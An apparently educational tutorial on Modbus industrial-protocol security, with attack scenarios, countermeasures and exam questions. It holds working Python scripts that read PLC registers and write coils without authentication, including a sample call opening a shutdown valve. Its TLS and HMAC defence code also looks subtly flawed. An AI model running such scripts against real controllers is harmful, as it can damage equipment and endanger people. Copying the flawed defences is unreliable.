====================================================================
Modbus Security - Industrial Protocol Protection
====================================================================

:Author: Cybersecurity Expert
:Date: January 2026
:Version: 1.0
:Standards: IEC 62443, Modbus Application Protocol v1.1b3

.. contents:: Table of Contents
   :depth: 2

TL;DR - Quick Reference
=======================

**Modbus Protocol:**

+------------------+--------------------------------------------------+
| **Parameter**    | **Value**                                        |
+==================+==================================================+
| **Variants**     | Modbus TCP, Modbus RTU, Modbus ASCII             |
+------------------+--------------------------------------------------+
| **Port**         | TCP 502 (Modbus TCP)                             |
+------------------+--------------------------------------------------+
| **Security**     | ⚠️ **None native** - plaintext, no auth          |
+------------------+--------------------------------------------------+
| **Use Cases**    | SCADA, PLC communication, sensor networks        |
+------------------+--------------------------------------------------+

**Threat Model:**

- ❌ No authentication (anyone can send commands)
- ❌ No encryption (plaintext data)
- ❌ No integrity check (messages can be modified)
- ⚠️ Exposed on TCP 502 (internet-facing PLCs)

**Security Enhancements:**

✅ **Modbus/TLS**: Encrypt with TLS 1.3
✅ **Firewall rules**: Restrict access to authorized IPs
✅ **VPN tunnels**: Isolate Modbus traffic
✅ **Application-layer auth**: Add HMAC to Modbus frames

Introduction
============

**Modbus** is the most widely used industrial protocol for SCADA/PLC communication.

**Variants:**

1. **Modbus RTU**: Serial (RS-485), binary encoding
2. **Modbus ASCII**: Serial, ASCII encoding  
3. **Modbus TCP**: Ethernet, TCP/IP (most common)

**Security Problem:**

Modbus was designed in 1979 with **no security**. Modern deployments expose Modbus TCP on the internet, creating massive attack surface.

Modbus TCP Frame Format
========================

.. code-block:: text

    Modbus TCP ADU (Application Data Unit):
    ┌──────────────────────────────────────┐
    │ MBAP Header (7 bytes)                │
    │  - Transaction ID (2 bytes)          │
    │  - Protocol ID (2 bytes) = 0x0000    │
    │  - Length (2 bytes)                  │
    │  - Unit ID (1 byte)                  │
    ├──────────────────────────────────────┤
    │ PDU (Protocol Data Unit)             │
    │  - Function Code (1 byte)            │
    │  - Data (N bytes)                    │
    └──────────────────────────────────────┘

**Common Function Codes:**

- **0x01**: Read Coils (digital outputs)
- **0x03**: Read Holding Registers (analog values)
- **0x05**: Write Single Coil
- **0x06**: Write Single Register
- **0x0F**: Write Multiple Coils
- **0x10**: Write Multiple Registers

Attack Scenarios
=================

**Attack 1: Unauthorized Read**

.. code-block:: python

    import socket
    
    # Attacker reads PLC registers (no authentication!)
    def read_modbus_registers(plc_ip, start_addr, count):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 502))
        
        # Modbus TCP request
        transaction_id = 0x0001
        protocol_id = 0x0000
        length = 0x0006
        unit_id = 0x01
        function_code = 0x03  # Read Holding Registers
        
        request = (
            transaction_id.to_bytes(2, 'big') +
            protocol_id.to_bytes(2, 'big') +
            length.to_bytes(2, 'big') +
            unit_id.to_bytes(1, 'big') +
            function_code.to_bytes(1, 'big') +
            start_addr.to_bytes(2, 'big') +
            count.to_bytes(2, 'big')
        )
        
        sock.send(request)
        response = sock.recv(1024)
        
        # Extract register values
        byte_count = response[8]
        registers = []
        for i in range(0, byte_count, 2):
            val = int.from_bytes(response[9+i:11+i], 'big')
            registers.append(val)
        
        return registers

**Attack 2: Unauthorized Write (Dangerous!)**

.. code-block:: python

    def write_modbus_coil(plc_ip, coil_addr, value):
        """Write to digital output (e.g., open valve, start motor)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 502))
        
        request = (
            b'\x00\x01'  # Transaction ID
            b'\x00\x00'  # Protocol ID
            b'\x00\x06'  # Length
            b'\x01'      # Unit ID
            b'\x05'      # Function: Write Single Coil
            + coil_addr.to_bytes(2, 'big')
            + (b'\xFF\x00' if value else b'\x00\x00')
        )
        
        sock.send(request)
        return sock.recv(1024)
    
    # ATTACK: Open emergency shutdown valve
    write_modbus_coil('192.168.1.100', 0x0010, True)

Security Countermeasures
=========================

**1. Modbus/TLS (Encryption)**

.. code-block:: python

    import ssl
    import socket
    
    def secure_modbus_connection(plc_ip, cert_file, key_file, ca_file):
        """Establish TLS-encrypted Modbus connection"""
        
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(cert_file, key_file)
        context.load_verify_locations(ca_file)
        context.check_hostname = False  # Modbus devices often use IP
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_sock = context.wrap_socket(sock, server_hostname=plc_ip)
        secure_sock.connect((plc_ip, 802))  # TLS Modbus port
        
        return secure_sock

**2. Application-Layer Authentication (HMAC)**

.. code-block:: c

    #include <openssl/hmac.h>
    
    // Add HMAC to Modbus frame
    void modbus_add_hmac(uint8_t *frame, size_t frame_len, 
                         const uint8_t *key, uint8_t *hmac_out) {
        unsigned int hmac_len;
        HMAC(EVP_sha256(), key, 32, frame, frame_len, hmac_out, &hmac_len);
    }
    
    // Verify HMAC before processing Modbus request
    int modbus_verify_hmac(uint8_t *frame, size_t frame_len,
                           const uint8_t *received_hmac, const uint8_t *key) {
        uint8_t computed_hmac[32];
        modbus_add_hmac(frame, frame_len, key, computed_hmac);
        
        if (memcmp(received_hmac, computed_hmac, 32) != 0) {
            printf("HMAC verification failed - rejecting Modbus frame\n");
            return -1;
        }
        return 0;
    }

**3. Firewall + VPN**

.. code-block:: bash

    # iptables rules: Only allow Modbus from specific IPs
    iptables -A INPUT -p tcp --dport 502 -s 10.0.1.0/24 -j ACCEPT
    iptables -A INPUT -p tcp --dport 502 -j DROP
    
    # Better: Use VPN for all Modbus traffic
    # Configure WireGuard/OpenVPN tunnel between SCADA and PLC

Exam Questions
==============

**Q1: Modbus Attack Impact (Medium)**

An attacker sends: Function Code 0x10 (Write Multiple Registers) to address 0x1000, value 0xFFFF.

What could happen if address 0x1000 controls a motor speed setpoint?

**Answer:** Motor runs at maximum speed (0xFFFF = 65535), potentially causing:
- Equipment damage
- Safety hazard
- Production disruption

**Mitigation:** Input validation, rate limiting, HMAC authentication

**Q2: Securing Legacy Modbus (Hard)**

You have 500 legacy PLCs that only support Modbus TCP (no TLS). Propose a security architecture.

**Answer:**

.. code-block:: text

    SCADA Server ←→ [Security Gateway] ←→ PLC Network
    
    Security Gateway functions:
    1. TLS termination (SCADA ↔ Gateway encrypted)
    2. Modbus firewall (whitelist function codes)
    3. Rate limiting (prevent DoS)
    4. Logging (audit all Modbus commands)

Standards Compliance
====================

- **IEC 62443-3-3**: Network security requirements
- **NIST SP 800-82**: ICS security guide
- **NERC CIP**: Critical infrastructure protection

**END OF DOCUMENT**
